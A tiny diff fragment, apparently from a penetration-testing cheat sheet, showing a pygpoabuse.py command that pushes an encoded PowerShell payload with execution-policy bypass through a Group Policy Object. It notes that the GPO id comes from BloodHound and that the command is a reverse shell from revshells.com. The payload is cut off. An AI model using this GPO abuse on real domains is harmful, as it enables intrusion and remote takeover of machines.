@@ -314,6 +314,7 @@ python3 pygpoabuse.py domain/user:'pass' -command "powershell -exec bypass -enc 
 
 Options:
 `-gpo-id` taken from bloodhound in Node field
+
 `-command` it's a reverse shell frome this https://www.revshells.com/[site]
 
 
